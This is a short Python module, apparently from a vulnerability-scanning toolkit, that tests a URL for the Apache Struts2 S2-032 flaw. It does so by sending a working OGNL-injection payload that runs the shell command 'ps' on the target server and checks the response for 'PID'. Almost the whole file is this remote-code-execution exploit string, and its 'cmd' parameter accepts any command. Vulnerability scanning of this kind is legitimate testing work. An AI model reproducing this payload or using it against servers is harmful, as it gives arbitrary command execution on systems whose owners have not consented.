# -*- encoding: utf-8 -*-
'''
@File : s2_032.py
@Time : 2019/08/03 22:02:50
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys

def s2_032(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=ps&pp=\\A&ppp=%20&encoding=UTF-8'''
    url += exp
    try:
        resp = requests.get(url,headers=headers, timeout=10)
        if "PID" in resp.text:
            print(Vcolors.RED +"存在S2-032漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-032漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-032漏洞~"+ Vcolors.ENDC)